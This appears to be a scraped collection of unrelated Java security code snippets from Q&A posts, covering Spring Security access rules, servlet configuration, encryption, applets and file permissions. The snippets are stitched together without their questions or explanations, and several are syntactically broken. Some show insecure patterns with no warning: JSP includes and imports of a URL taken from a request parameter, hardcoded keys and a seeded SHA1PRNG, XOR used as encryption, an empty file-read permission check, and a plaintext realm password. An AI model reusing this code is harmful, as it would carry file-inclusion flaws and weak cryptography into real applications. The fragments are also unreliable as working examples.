                    .antMatchers("/admin/**").access("hasRole('admin') and hasIpAddress('192.168.1.0/24')")
                    .antMatchers("/admin/**").access("hasRole('admin') and hasIpAddress('0:0:0:0:0:0:0:1')");
        }
     
        //some other configurations
    }
---UNIQUEIDFORSNIP---|112440962|    http://localhost:9595/admin/checkappeals/211
---UNIQUEIDFORSNIP---|112440966|    http
        .authorizeRequests()
            .antMatchers("/admin/**").acces("hasRole('admin') and (hasIpAddress('127.0.0.1') or hasIpAddress('192.168.1.0/24') or hasIpAddress('0:0:0:0:0:0:0:1'))";
---UNIQUEIDFORSNIP---|112491058|     http.authorizeRequests()
            .antMatchers("/api/**").authenticated();
---UNIQUEIDFORSNIP---|112491062|    http.authorizeRequests()
            .antMatchers(HttpMethod.GET, "/api/password/reset").permitAll();
---UNIQUEIDFORSNIP---|112651944|    auth.jdbcAuthentication() .dataSource(dataSource)
		 * .passwordEncoder(passwordEncoder) .usersByUsernameQuery(
    //   ....
---UNIQUEIDFORSNIP---|112846786|    <beans xmlns="http://www.springframework.org/schema/beans" xmlns:security="http://www.springframework.org/schema/security" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:util="http://www.springframework.org/schema/util" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
    			http://www.springframework.org/schema/security http://www.springframework.org/schema/security/spring-security-3.0.4.xsd
    			http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">
    
       <security:http>
           <security:intercept-url pattern="/login" access="permitAll"
               requires-channel="https"/>
       </security:http> 
    
    </bean>
---UNIQUEIDFORSNIP---|112958777|    java.io.FileNotFoundException: 
                    /var/data/tdb/kb/node2id.idn (Permission denied)
---UNIQUEIDFORSNIP---|112967599|    @Bean
    public FilterRegistrationBean remoteAddressFilter() {
        FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean();
        RemoteAddrFilter filter = new RemoteAddrFilter();
        filter.setAllow("192.168.0.2");
        filter.setDenyStatus(404);
        filterRegistrationBean.setFilter(filter);
        filterRegistrationBean.addUrlPatterns("/*");
        return filterRegistrationBean;
    }
---UNIQUEIDFORSNIP---|113665228|     SecurityManager security = System.getSecurityManager();
     if (security != null) {
         security.checkXXX(argument,  . . . );
     }
---UNIQUEIDFORSNIP---|113665231|    @Override 
    public void checkRead(String file) {
      // empty method as we are happy to allow all file reads
    }
---UNIQUEIDFORSNIP---|113792724|	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
			 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
			 xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
			 xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
			 version="3.0">
		<servlet-mapping>
			<servlet-name>default</servlet-name>
			<url-pattern>/WEB-INF/classes/static/login/*</url-pattern>
		</servlet-mapping>
		<security-constraint>
			<web-resource-collection>
				<web-resource-name>Authentication</web-resource-name>
				<url-pattern>/test/auth/*</url-pattern>
			</web-resource-collection>
			<auth-constraint>
				<role-name>users</role-name>
			</auth-constraint>
		</security-constraint>
		<login-config>
			<auth-method>FORM</auth-method>
			<form-login-config>
				<form-login-page>/WEB-INF/classes/static/login/login.html</form-login-page>
				<form-error-page>/WEB-INF/classes/static/login/loginerror.html</form-error-page>
			</form-login-config>
		</login-config>
		<security-role>
			<role-name>users</role-name>
		</security-role>
	</web-app>
---UNIQUEIDFORSNIP---|113833284|    Arrays.fill(password, ' ');
    password = null;
---UNIQUEIDFORSNIP---|113863370|     <transport-guarantee>NONE</transport-guarantee>
---UNIQUEIDFORSNIP---|114006193|    @WebServlet("/logout")
    public class LogoutServlet extends HttpServlet {
      public void doGet(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException {
            HttpSession session= req.getSession();
            session.invalidate();
            RequestDispatcher rd = req.getRequestDispatcher("/login.xhtml"); //The url where go after logout
            rd.forward(req,res);
      }
    }
---UNIQUEIDFORSNIP---|114006196|    <a href="/logout">Logout</a>
---UNIQUEIDFORSNIP---|114006199|    <a href="${request.contextPath}/logout">Logout</a>
---UNIQUEIDFORSNIP---|114129030|		<dependency>
			<groupId>org.hdiv</groupId>
			<artifactId>hdiv-jstl-taglibs-1.2</artifactId>
			<version>${org.hdiv-version}</version>
		</dependency>
---UNIQUEIDFORSNIP---|114129032|    localhost:8080/spring-security-example/messages/message?_HDIV_STATE_=26-0-830046F08D66980D1B35F52F2D6677E0
---UNIQUEIDFORSNIP---|114129034|    LinkUrlProcessor urlProcessor = HDIVUtil.getLinkUrlProcessor(servletContext);
    String processUrl = urlProcessor.processUrl(request, "/messages/messages");
---UNIQUEIDFORSNIP---|114193681|    <jsp:include page="<%=(String)request.getParameter(\"template\")%>"> 
---UNIQUEIDFORSNIP---|114193683|    <c:import url="<%= request.getParameter("privacy")%>"> 
---UNIQUEIDFORSNIP---|114234407|    String sanitize(String url) throws EncodingException{
		
		Encoder encoder = new DefaultEncoder(new ArrayList<String>());
		//first canonicalize
		String clean = encoder.canonicalize(url).trim();
		//then url decode 
		clean = encoder.decodeFromURL(clean);
		
		//detect and remove any existent \r\n == %0D%0A == CRLF to prevent HTTP Response Splitting
		int idxR = clean.indexOf('\r');
		int idxN = clean.indexOf('\n');
		
		if(idxN >= 0 || idxR>=0){
			if(idxN>idxR){
				//just cut off the part after the LF
				clean = clean.substring(0,idxN-1);
			}
			else{
				//just cut off the part after the CR
				clean = clean.substring(0,idxR-1);
			}
		}
		
		//re-encode again
		return encoder.encodeForURL(clean);
	}
---UNIQUEIDFORSNIP---|114487784|    AccessController.doPrivileged(new PrivilegedAction() {
        public Object run() {
            // perform the security-sensitive operation here
            return null;
        }
    });
---UNIQUEIDFORSNIP---|114520543|    new File("/Users/example/projects/sample/target", "../pom.xml").getCanonicalFile();
---UNIQUEIDFORSNIP---|114631201|    <Context sessionCookieDomain=".domain-name.com" />
---UNIQUEIDFORSNIP---|114631203|    @Bean
    public ServletContextInitializer servletContextInitializer() {
    	return new ServletContextInitializer() {
    
    		@Override
    		public void onStartup(ServletContext servletContext) throws ServletException
    		{
    			servletContext.getSessionCookieConfig().setDomain(".domain-name.com");
    		}
    	};
    
    }
---UNIQUEIDFORSNIP---|114690384|    import javax.ejb.EJBAccessException;
    import javax.ws.rs.core.Response;
    import javax.ws.rs.ext.ExceptionMapper;
    import javax.ws.rs.ext.Provider;
    
    @Provider
    public class EJBAccessExceptionMapper implements
            ExceptionMapper<EJBAccessException>
    {
      @Override
      public Response toResponse(EJBAccessException exception)
      {
        return Response.status(Response.Status.UNAUTHORIZED).build();
      }
    }
---UNIQUEIDFORSNIP---|114694884|    @ServletSecurity((httpMethodConstraints = {
        @HttpMethodConstraint(value = "GET", rolesAllowed = "SSORole"),
        @HttpMethodConstraint(value = "POST", rolesAllowed = "SSORole",
        transportGuarantee = TransportGuarantee.CONFIDENTIAL)
    })
---UNIQUEIDFORSNIP---|114724487|    http://bugs.java.com/bugdatabase/view_bug.do?bug_id=4007892
---UNIQUEIDFORSNIP---|114975714|    CODE='package.PortalLauncher.class' 
---UNIQUEIDFORSNIP---|114975717|    CODE='package.PortalLauncher' 
---UNIQUEIDFORSNIP---|114975720|    WIDTH='0' HEIGHT='0'>
---UNIQUEIDFORSNIP---|115435723|    <authentication-manager>
	  <authentication-provider>
	    <password-encoder hash="bcrypt" />
	  </authentication-provider>
    </authentication-manager>
---UNIQUEIDFORSNIP---|115435727|    <authentication-manager>
	  <authentication-provider>
	    <password-encoder ref="encoder" />
	  </authentication-provider>
    </authentication-manager>
	
    <beans:bean id="encoder" 
	  class="org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder">
	    <beans:constructor-arg name="strength" value="15" />
    </beans:bean>
---UNIQUEIDFORSNIP---|115435730|    <beans:bean id="daoAuthenticationProvider" class="org.springframework.security.authentication.dao.DaoAuthenticationProvider">
      <beans:property name="userDetailsService" ref="userDetailsService"/>
      <beans:property name="passwordEncoder" ref="encoder" />
    </beans:bean>
    <bean id="encoder" class="org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder"/>
---UNIQUEIDFORSNIP---|115602022|    bb.clear();
    while(bb.remaining() >= 8) bb.putLong(0);
    while(bb.remaining() > 0) bb.put((byte) 0);
---UNIQUEIDFORSNIP---|115618747|    String queryString = "select * from EMP e where e.name = ?1";
    Query query = em.createNativeQuery(queryString, Employee.class);
    query.setParameter(1, "Mickey");
---UNIQUEIDFORSNIP---|115680224|    <jaxws:endpoint id="myService" implementor="#myServiceImpl" address="/myService">
    <jaxws:inInterceptors>
    <bean class="org.apache.cxf.binding.soap.saaj.SAAJInInterceptor" />
    <ref bean="myServiceInterceptor"/>
    </jaxws:inInterceptors>
    <jaxws:properties>
    <entry key="ws-security.ut.validator" value-ref="myServiceUsernameTokenValidator"/>
    <jaxws:properties>
     </jaxws:endpoint>
    <bean id=" myServiceInterceptor "   class="org.apache.cxf.ws.security.wss4j.WSS4JInInterceptor">
     <constructor-arg>                              
     <map>
        <entry key="action" value="UsernameToken" />
        <entry key="passwordType" value="PasswordText" />
      </map>          
    </constructor-arg>
    </ bean>
---UNIQUEIDFORSNIP---|115680226|     stringDigester.matches(passwordText, passwordDigest)
---UNIQUEIDFORSNIP---|115701869|    public class NoIFrameAllowedServlet extends HttpServlet {
      
      public void doGet(HttpServletRequest request,
                        HttpServletResponse response)
          throws ServletException, IOException {
          response.setHeader("X-Frame-Options", "SAMEORIGIN");
        }
---UNIQUEIDFORSNIP---|115743051|    MyAESKey myAESKey = new MyAESKey(new byte[16]);
	Cipher aes = Cipher.getInstance("AES");
	aes.init(Cipher.ENCRYPT_MODE, myAESKey);
	aes.doFinal("owlstead".getBytes());
	myAESKey.destroy();
	aes.doFinal("owlstead".getBytes());
	aes.init(Cipher.ENCRYPT_MODE, myAESKey);
	aes.doFinal("owlstead".getBytes());
---UNIQUEIDFORSNIP---|115903376|    @RestController
    @ControllerAdvice
    public class ExceptionHandlerController {
	    @ExceptionHandler(UsernameNotFoundException.class, DataAccessException.class)
	    @ResponseStatus(HttpStatus.SC_UNAUTHORIZED)
	    @ResponseBody ErrorInfo
	    UnauthorizeExceptionInfo(HttpServletRequest req, Exception ex) {
	        return new ErrorInfo(req.getRequestURL(), ex);
	    } 
    }
---UNIQUEIDFORSNIP---|115903382|	@JsonIgnore
	public final StringBuffer url;
    public final String ex;
    public ErrorInfo(StringBuffer stringBuffer, Exception ex) {
        this.url = stringBuffer;
        this.ex = ex.getLocalizedMessage();
    }
---UNIQUEIDFORSNIP---|116077961|    import java.lang.reflect.Method;
    public class Access {
        public static void main(String[] args) throws Exception {
            Class<?> imageFetcher = Class.forName("sun.awt.image.FetcherInfo");
            for (Method method : imageFetcher.getDeclaredMethods()) {
                ;
            }
            Method method = imageFetcher.getDeclaredMethod("getFetcherInfo");
            method.setAccessible(true);
            Object fetcher = method.invoke(null);
            System.err.println(fetcher);
        }
    }
---UNIQUEIDFORSNIP---|116127610|    String[] splitToken = result.Value.Content.AuthorizationJWTToken.split("\\.");
	Jwt parsedToken = Jwts.parser().parse(splitToken[0] + "." + splitToken[1] + ".");
					
---UNIQUEIDFORSNIP---|116130210|    BigInteger modulus = new BigInteger(1, Base64.decodeBase64(jsonKey.getN()));
    BigInteger exponent = new BigInteger(1, Base64.decodeBase64(jsonKey.getE()));
---UNIQUEIDFORSNIP---|116130212|    BigInteger modulus = new BigInteger(1, Base64.getUrlDecoder().decode(jsonKey.getN()));
    BigInteger exponent = new BigInteger(1, Base64.getUrlDecoder().decode(jsonKey.getE()));
---UNIQUEIDFORSNIP---|116149082|    <property name="key" value="overwritten"/>
---UNIQUEIDFORSNIP---|116281968|    [req]
    req_extensions = v3_req
    
    [ v3_req ]
    subjectAltName=IP:10.0.0.1
    # or subjectAltName=DNS:www.example.com
---UNIQUEIDFORSNIP---|116325270|    CSRF protection is enabled by default with Java configuration.
    If you would like to disable CSRF, the corresponding Java configuration
    can be seen below. Refer to the Javadoc of csrf() for additional
    customizations in how CSRF protection is configured.
---UNIQUEIDFORSNIP---|116325272|    The last step is to ensure that you include the CSRF token in all
    PATCH, POST, PUT, and DELETE methods.
---UNIQUEIDFORSNIP---|116325323|    <form name="f" th:action="@{/login}" method="post">               
      <fieldset>
        <input type="hidden" 
               th:name="${_csrf.parameterName}" 
               th:value="${_csrf.token}" />
        ...
      </fieldset>
    </form>
---UNIQUEIDFORSNIP---|116375589|    byte [] encryptOrDecrypt(byte[] key, byte[] input){
        byte [] result = new byte[input.length];
        for(int i=0; i<input.length; i++) {
            result[i] = input[i] ^ key[i % key.length];
        }
        return result;
    }
---UNIQUEIDFORSNIP---|116487115|    String lineSeparator = java.security.AccessController.doPrivileged(
        new java.security.PrivilegedAction<String>() {
            public String run() {
                return System.getProperty("line.separator");
            }
        }
     );
---UNIQUEIDFORSNIP---|116487118|    String lineSeparator = System.getProperty("line.separator");
---UNIQUEIDFORSNIP---|116533924|    String message = "Hi Sign ME!!!";
    s.update(message.getBytes("UTF8");
    byte[] signature = s.sign()
    
    oos.writeObject(message);
    oos.writeObject(signature);
---UNIQUEIDFORSNIP---|116696155|    package org.myorg;
    
    import java.security.PrivilegedExceptionAction;
    
    import org.apache.hadoop.conf.*;
    import org.apache.hadoop.security.UserGroupInformation;
    import org.apache.hadoop.fs.Path;
    import org.apache.hadoop.fs.FileSystem;
    import org.apache.hadoop.fs.FileStatus;
    
    public class HdfsTest {
    
        public static void main(String args[]) {
    
            try {
                UserGroupInformation ugi
                    = UserGroupInformation.createRemoteUser("hbase");
    
                ugi.doAs(new PrivilegedExceptionAction<Void>() {
    
                    public Void run() throws Exception {
    
                        Configuration conf = new Configuration();
                        conf.set("fs.defaultFS", "hdfs://1.2.3.4:8020/user/hbase");
                        conf.set("hadoop.job.ugi", "hbase");
    
                        FileSystem fs = FileSystem.get(conf);
    
                        fs.createNewFile(new Path("/user/hbase/test"));
    
                        FileStatus[] status = fs.listStatus(new Path("/user/hbase"));
                        for(int i=0;i<status.length;i++){
                            System.out.println(status[i].getPath());
                        }
                        return null;
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
---UNIQUEIDFORSNIP---|116828339|    m = 10001621865  c = 31116156015
    m = 10001621866  c = 33031668326
    m = 10001621867  c = 37351399313
    m = 10001621868  c = 6071714212
    m = 10001621869  c = 1188523761
    m = 10001621870  c = 18341011998
    m = 10001621871  c = 7620400191
    m = 10001621872  c = 36106912203
    m = 10001621873  c = 37615263725
    m = 10001621874  c = 7795237418
    m = 10001621875  c = 34774459868
    m = 10001621876  c = 4555747045
    m = 10001621877  c = 33123599635
    m = 10001621878  c = 34836418207
    m = 10001621879  c = 33962453633
    m = 10001621880  c = 6258371439
    m = 10001621881  c = 7500991556
    m = 10001621882  c = 5071836635
    m = 10001621883  c = 911495880
    m = 10001621884  c = 39558568485
---UNIQUEIDFORSNIP---|117069142|    AccountManager accountManager = AccountManager.get(this);
    Account[] accounts = accountManager.getAccounts();
    accountManager.getUserData(accounts[0], AccountManager.KEY_USERDATA);
---UNIQUEIDFORSNIP---|117080177|    private static byte[] encrypt(byte[] raw, byte[] clear) throws Exception 
    {
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
        byte[] encrypted = cipher.doFinal(clear);
        return encrypted;
    }
 
    private static byte[] decrypt(byte[] raw, byte[] encrypted) throws Exception     
    {
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, skeySpec);
        byte[] decrypted = cipher.doFinal(encrypted);
        return decrypted;
    }
---UNIQUEIDFORSNIP---|117080180|	ByteArrayOutputStream baos = new ByteArrayOutputStream();  
	bm.compress(Bitmap.CompressFormat.PNG, 100, baos); 
	byte[] b = baos.toByteArray();  
	 
	byte[] keyStart = "encryption key".getBytes();
	KeyGenerator kgen = KeyGenerator.getInstance("AES");
	SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
	sr.setSeed(keyStart);
	kgen.init(128, sr); 
	SecretKey skey = kgen.generateKey();
	byte[] key = skey.getEncoded();    
	 
	// encrypt
	byte[] encryptedData = encrypt(key,b);
	// decrypt
	byte[] decryptedData = decrypt(key,encryptedData);
---UNIQUEIDFORSNIP---|117080184|	static {
			System.loadLibrary("library-name");
		}
	 
	public native String getSecretKey();
---UNIQUEIDFORSNIP---|117080187|    Java_com_example_exampleApp_ExampleClass_getSecretKey(
               JNIEnv* env, jobject thiz )
    {
        return (*env)->NewStringUTF(env, "mySecretKey".");
    }
---UNIQUEIDFORSNIP---|117080189|    byte[] keyStart = getSecretKey().getBytes();
---UNIQUEIDFORSNIP---|117358135|    <bean id="authenticationManager" class="org.acegisecurity.providers.ProviderManager">
        <property name="providers">
            <list>
                <ref local="ldapAuthenticationProvider"/>
            </list>
        </property>	
    </bean>
---UNIQUEIDFORSNIP---|117358139|    <bean id="ldapAuthenticationProvider" class="org.acegisecurity.providers.ldap.LdapAuthenticationProvider">
        <constructor-arg><ref local="authenticator"/></constructor-arg>
	    <constructor-arg><ref local="populator"/></constructor-arg>
	    <property name="userCache"><ref local="userCache"/></property>
	</bean>
---UNIQUEIDFORSNIP---|117372990|    TimeStampRequest req = reqgen.generate(TSPAlgorithms.SHA1, digest);
---UNIQUEIDFORSNIP---|117372992|    "hello".getBytes();
---UNIQUEIDFORSNIP---|117372996|	static public byte[] calculateMessageDigest()
			throws NoSuchAlgorithmException, IOException {
		SHA1Digest md = new SHA1Digest();
		byte[] dataBytes = "helloooooooooooooo".getBytes();
		int nread = dataBytes.length;
		md.update(dataBytes, 0, nread);
		byte[] result = new byte[32];
		md.doFinal(result, 0);
		return result;
---UNIQUEIDFORSNIP---|117375806|    password=
---UNIQUEIDFORSNIP---|117375809|    import java.io.*;
    import java.util.*;
    
    class Test{
        public static void main(String [] args) throws Exception {
            Properties props = new Properties();
            props.load(new StringReader("password="));
            System.out.println(props.size()); // 1
            System.out.println(props.getProperty("password").length()); // 0
        }
    }
---UNIQUEIDFORSNIP---|117401754|    public class CustomService implements UserDetailsService {
       @Transactional(readOnly = true)
        public UserDetails loadUserByUsername(String username) {
    
            Account account = accountDAO.findAccountByName(username);
    
            if (account == null) {
                throw new UsernameNotFoundException("account name not found");
            }
            return buildUserFromAccount(account);
        }
    
       
        @SuppressWarnings("unchecked")
        @Transactional(readOnly = true)
        private User buildUserFromAccount(Account account) {
    
            String username = account.getUsername();
            String password = account.getPassword();
            boolean enabled = account.getEnabled();
            boolean accountNonExpired = account.getAccountNonExpired();
            boolean credentialsNonExpired = account.getCredentialsNonExpired();
            boolean accountNonLocked = account.getAccountNonLocked();
    
            // additional information goes here
            String companyName = companyDAO.getCompanyName(account);
            
    
            Collection<GrantedAuthority> authorities = new ArrayList<GrantedAuthority>();
            for (Role role : account.getRoles()) {
                authorities.add(new SimpleGrantedAuthority(role.getName()));
            }
    
            CustomUserDetails user = new CustomUserDetails (username, password, enabled, accountNonExpired, credentialsNonExpired, accountNonLocked,
                    authorities, company);
    
            return user;
        }
    public class CustomUserDetails extends User{
    
        // ...
        public CustomUserDetails(..., String company){
             super(...);
             this.company = company;
        }
        private String company;
    
        public String getCompany() { return company;}
    
        public void setCompany(String company) { this.company = company;}
    }
---UNIQUEIDFORSNIP---|117463514|        Path tmpPath = Paths.get("/tmp/"); //valid directory
        String fileName = "foo/bar.xls"; //supplied fileName
    
        Path filePath = tmpPath.resolve(fileName); //add fileName to path
        Path fileParent = filePath.getParent(); //get parent directory
        System.out.println(fileParent);
        System.out.println(tmpPath.equals(fileParent)); //false because fileParent is '/tmp/foo'
---UNIQUEIDFORSNIP---|117478023|     <security-role>
        <role-name>testing</role-name>
     </security-role>
---UNIQUEIDFORSNIP---|117678310|    c:\ BUILTIN\Users:(OI)(CI)(RX) - read + execute permission
    c:\bar BUILTIN\Users:(RX) - read + execute permission
    c:\foo BUILTIN\Users:(F) - full permission
---UNIQUEIDFORSNIP---|117678312|	public class AccessCheckDemo {
		public static void main(String[] args) throws IOException {
			String[] files = {"c:/foo", "c:/bar"};
			for (String file : files) {
        	    Path path = Paths.get(file);
    	        System.out.println("check " + path);
	            System.out.println("file      Files.isWritable: "
            	        + Files.isWritable(path));
        	    System.out.println("directory Files.isWritable: "
    	                + Files.isWritable(path.getParent()));
	        	System.out.println();
			}
		}
	}
---UNIQUEIDFORSNIP---|117678314|	check c:\foo
	file      Files.isWritable: true
	directory Files.isWritable: false
	check c:\bar
	file      Files.isWritable: true
	directory Files.isWritable: false
---UNIQUEIDFORSNIP---|117934001|    function loadApplet(code,codebase,width,height,alt){
        var placeholder=document.getElementById('placeholder');
        if(window.opera){
            placeholder.innerHTML='<applet code="'+code+'" codebase="'+codebase+'" width="'+width+'" height="'+height+'" alt="'+alt+'"></applet>';
        }else{
            var a=document.createElement('applet');
            a.setAttribute('code',code);
            a.setAttribute('codebase',codebase);
            a.setAttribute('width',width);
            a.setAttribute('height',height);
            a.setAttribute('alt',alt);
            placeholder.appendChild(a);
        }
    }
---UNIQUEIDFORSNIP---|117934003|    function loadApplet(code,codebase,width,height,alt){
        var placeholder=document.getElementById('placeholder');
        var a = document.createElement('object');
        a.setAttribute('type','application/x-java-applet');
        a.setAttribute('width',width);
        a.setAttribute('height',height);
        a.setAttribute('alt',alt);
        
        var codeParam = document.createElement('param');
        codeParam.setAttribute('name','code');
        codeParam.setAttribute('value',code);
        a.appendChild(codeParam);
        var codebaseParam = document.createElement('param');
        codebaseParam.setAttribute('name','codebase');
        codebaseParam.setAttribute('value',codebase);
        a.appendChild(codebaseParam);
        placeholder.appendChild(a);
    }
---UNIQUEIDFORSNIP---|117934005|    <div id="placeholder"></div>
    <input type="button" value="Load Applet" onclick="loadApplet('TestApplet.class','.','200','300','demo applet')" />
---UNIQUEIDFORSNIP---|117934009|    function loadApplet() {
        // Your existing applet loading code
    }
---UNIQUEIDFORSNIP---|117934016|    <div id="appletContainer" runat="server" style="width:(document.body.clientWidth - 270);height:300" clientidmode="Static">
        <script type="text/javascript">
            // Wrap your code with a function called loadApplet
            function loadApplet() {
                // Your applet loading code:
                var showCI = 0;                                        
                if (document.getElementById("hdnHas3D").value == "1" && !isAppleMobile()) {
                    var J3DStyleID = document.getElementById("hdn3DStyleID").value;
                    var code = "com.wirefusion.player.AppletPlayer";
                    var archiveList = "Some achive List";                                         
                    var width = document.body.clientWidth - 270;
                    var height = 300; 
                    var attributes = {
                        id: "appletContainerX",
                        name: J3DStyleID,
                        code: code,
                        codebase: ".",
                        width: width,
                        height: height,
                        mayscript: "true"
                    };
                    var parameters = {
                        progressFunc: "handleAppletProgress",
                        archive: archiveList,
                        java_arguments: "-Xmx200m",
                        regid: "6050-25",                                                
                        resourcefolder: "/RichContent/3D_Vehicles/J3D/Vehicles/" + J3DStyleID + "/",
                        preloadfile: J3DStyleID + ".jar",
                        environmentType: "WEBSITE",
                        environmentWidth: width,
                        environmentHeight: height,
                        groupsXMLFile: "../../Resources/groups.xml",
                        vehicleXMLFile: J3DStyleID + ".xml"
                    };
                    var version = '1.6.0_20'; 
                    if (deployJava.versionCheck(version + '+')) {
                        docWriteWrapper(function () {
                            deployJava.runApplet(attributes, parameters, version);
                        });                                               
                    } else {
                        if (document.getElementById("iframeContainer").style.display != "none") {
                            alert("Unable to load Interactive mode");
                            showCI = 1;
                        }
                    }
                }
            }
        </script>
    </div>
---UNIQUEIDFORSNIP---|117934020|    <input type="button" value="Show in 3D" onclick="loadApplet()" />
---UNIQUEIDFORSNIP---|117934024|    <input type="button" value="Show in 3D" onclick="loadApplet(); showApplet();" />
---UNIQUEIDFORSNIP---|118058418|    public void contextInitialized(ServletContextEvent sce) {
         boolean secure = ...
         sce.getServletContext().getSessionCookieConfig().setSecure(secure);
    }
---UNIQUEIDFORSNIP---|118149844|    private boolean isReadOnlyFile(Path file)
        {
            if(Platform.isWindows())
            {
                if (!file.toFile().canWrite())
                {
                    DosFileAttributes dosAttr;
                    try
                    {
                        dosAttr = Files.readAttributes(file, DosFileAttributes.class);
                        if(dosAttr.isReadOnly())
                        {
                            return true;
                        }
                    }
                    catch (IOException e)
                    {
    
                    }
                }
            }
            return false;
        }
---UNIQUEIDFORSNIP---|118153249|    security-constraint>
        <web-resource-collection>
            <web-resource-name>Some authentification required</web-resource-name>
            <url-pattern>/services/MyService</url-pattern>
    		<http-method>POST</http-method>
        </web-resource-collection>
        <auth-constraint><role-name>somebody</role-name></auth-constraint>          
    </security-constraint>
---UNIQUEIDFORSNIP---|118167284|        final Container c = (Container) container;
        final AtomicReference<Object[]> result = new AtomicReference<>();
        try {
            SwingUtilities.invokeAndWait(new Runnable() {
                @Override
                public void run() {
                    result.set(c.getComponents());
                }
            });
        } catch (Exception e) {
             throw new RuntimeException(e.getMessage(), e);
        }
        Object[] components = result.get();
        Vector componentVector = Utils.convertArrayToVector(components);
---UNIQUEIDFORSNIP---|118288501|    <applet id="fpa"
        code="SensorApplet" archive="FingerprintApplet.jar, Jarlib1.jar, Jarlib2.jar, Jarlib3.jar"
        width="300" height="400">
    </applet>
---UNIQUEIDFORSNIP---|118293824|    $JAVA_HOME/jre/lib/security
---UNIQUEIDFORSNIP---|118293826|    $JAVA_HOME/lib/security
---UNIQUEIDFORSNIP---|118308003|    public static DefaultHttpClient getClient(String username, String password,
			Integer timeOut) {
		HttpParams httpParams = new BasicHttpParams();
		HttpConnectionParams.setConnectionTimeout(httpParams, timeOut);
		HttpConnectionParams.setSoTimeout(httpParams, timeOut);
		DefaultHttpClient retHttpClient = new DefaultHttpClient(httpParams);
		if (username != null) {
			retHttpClient.getCredentialsProvider().setCredentials(
					new AuthScope(AuthScope.ANY_HOST, AuthScope.ANY_PORT),
					new UsernamePasswordCredentials(username, password));
		}
		return retHttpClient;
	}
---UNIQUEIDFORSNIP---|118355391|    loginAndAction("anything", action)
---UNIQUEIDFORSNIP---|118355393|    //jaas-krb5.conf
    anything {
        com.sun.security.auth.module.Krb5LoginModule required
        useKeyTab=true
        storeKey=true
        doNotPrompt=true
        keyTab="/home/myusr/my-server.keytab"
        principal="myserv/mymachine.some.domain";
    };
---UNIQUEIDFORSNIP---|118402636|    public class AdminPermitVoter implements AccessDecisionVoter<Object> {
    
    	@Override
    	public boolean supports(ConfigAttribute attribute) {
    		return true;
    	}
    
    	@Override
    	public boolean supports(Class<?> clazz) {
    		return true;
    	}
    
    	@Override
    	public int vote(Authentication authentication, Object object, Collection<ConfigAttribute> attributes) {
    		if(isAdmin(extractAuthorities(authentication))) {
    			return ACCESS_GRANTED;
    		}
    		return ACCESS_ABSTAIN;
    	}
    
    	Collection<? extends GrantedAuthority> extractAuthorities(Authentication authentication) {
    		return authentication.getAuthorities();
    	}
    
    	private boolean isAdmin(Collection<? extends GrantedAuthority> authorities) {
    		for(GrantedAuthority authority : authorities) {
    			if(equalsIgnoreCase(ADMIN_ROLE_NAME, authority.getAuthority())) {
    				return true;
    			}
    		}
    
    		return false;
    	}
    }
---UNIQUEIDFORSNIP---|118402638|    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
        	.authorizeRequests()
        		.accessDecisionManager(accessDecisionManager())
        		.anyRequest()
        		.permitAll()
            [...other configs...]
     }
    
    @Bean(name = "accessDecisionManager")
    public AccessDecisionManager accessDecisionManager() {
    	List<AccessDecisionVoter> voters = new ArrayList<>();
    	voters.add(new AdminPermitVoter());
    	voters.add(new WebExpressionVoter());
    	voters.add(new RoleVoter());
    	voters.add(new AuthenticatedVoter());
    	return new AffirmativeBased(voters);
    }
---UNIQUEIDFORSNIP---|118402641|    @Configuration
    @EnableGlobalMethodSecurity(securedEnabled = true)
    public class MethodSecurityConfig extends GlobalMethodSecurityConfiguration {
    
    	@SuppressWarnings("rawtypes")
    	@Override
    	protected AccessDecisionManager accessDecisionManager() {
    		List<AccessDecisionVoter> voters = new ArrayList<>();
    		voters.add(new AdminPermitVoter());
    		voters.add(new RoleVoter());
    		voters.add(new AuthenticatedVoter());
    		return new AffirmativeBased(voters);
    	}
    	
    }
---UNIQUEIDFORSNIP---|118485195|    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE Configure PUBLIC "-//Mort Bay Consulting//DTD Configure 1.1//EN"    
     "http://jetty.mortbay.org/configure_1_2.dtd">
    <Configure class="org.mortbay.jetty.webapp.WebAppContext">
      <Get name="securityHandler">
        <Set name="userRealm">
          <New class="org.mortbay.jetty.security.HashUserRealm">
            <Set name="name">MyRealm</Set>
            <Call name="addUserToRole">
              <Arg>dfa</Arg>
              <Arg>*</Arg> <!-- * is a "builtin" realm for GAE -->
            </Call>
            <Call name="put">
              <Arg>dfa</Arg>
              <Arg>secret</Arg>
            </Call>
          </New>
        </Set>
      </Get>
    </Configure>
---UNIQUEIDFORSNIP---|118493126|AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
               .. do something that only works with signed applets ..
            }
        });
---UNIQUEIDFORSNIP---|118496277|    c2.multiply(c1.modPow(x.negate(), p)).mod(p)
---UNIQUEIDFORSNIP---|118503208|    public Class loadClass(String name) throws ClassNotFoundException {
        if(name.equals("javax.lang.ClassIDontLike")){
           throw new ClassNotFoundException("I'm sorry, Dave. I'm afraid I can't do that.");
        }
        return super.loadClass(name, false);
    }
---UNIQUEIDFORSNIP---|119112463|    $JAVA_HOME/bin/keytool -import -alias mycertificate -keystore path_to_keystore -file certificate_file 
---UNIQUEIDFORSNIP---|119314223|    ant compile
---UNIQUEIDFORSNIP---|119467859|    <ruleset version="1.0+">
